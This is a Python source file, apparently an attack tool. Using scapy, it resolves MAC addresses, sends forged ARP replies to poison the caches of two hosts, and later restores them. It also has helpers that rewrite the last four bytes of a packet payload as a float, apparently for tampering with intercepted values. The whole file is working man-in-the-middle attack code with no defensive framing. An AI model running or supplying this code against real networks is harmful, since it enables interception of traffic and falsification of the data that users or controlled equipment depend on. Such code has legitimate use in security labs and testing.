import codecs
import struct
import binascii

from scapy.all import srp, send
from scapy.layers.l2 import Ether, ARP


def get_mac(an_ip):
    """
    This function translates an IP address to a MAC address

    :param an_ip: The IP address to translate
    """
    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=an_ip)
    target_mac = srp(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
    return target_mac

def launch_arp_poison(ip1, ip2):
    """
    This function will start the ARP spoofing between two provided IPs

    :param ip1: The first IP address
    :param ip2: The second IP address
    """
    mac1 = get_mac(ip1)
    mac2 = get_mac(ip2)

    spoof_arp_cache(ip1, mac1, ip2)
    spoof_arp_cache(ip2, mac2, ip1)

def spoof_arp_cache(target_ip, target_mac, source_ip):
    """
    This function will send the ARP packet from the source to the target

    :param target_ip: The IP of the target
    :param target_mac: The mac of the target
    :param source_ip: The IP of the source
    """
    spoofed = ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
    send(spoofed, verbose=False)

def restore_arp(ip1, ip2):
    """
    This function will restore the ARP spoof between two IPs

    :param ip1: The first IP address
    :param ip2: The second IP address
    """
    mac1 = get_mac(ip1)
    mac2 = get_mac(ip2)

    packet = ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2)
    send(packet, verbose=False)

    packet = ARP(op=2, pdst=ip2, hwdst=mac2, psrc=ip1, hwsrc=mac1)
    send(packet, verbose=False)

def translate_payload_to_float(raw_payload):
    """
    This function will convert a raw packet payload to a float number

    :param raw_payload: The payload to convert
    """
    return struct.unpack('<f', raw_payload[-4:])[0]


def translate_float_to_payload(float_value, original_payload):
    """
    This function will convert a float number to a raw package payload

    :param float_value: The float number to convert
    :param original_payload: The original payload of the packet
    """
    float_in_bytes = struct.pack('<f', float_value)
    result = original_payload[0:-4] + float_in_bytes
    return result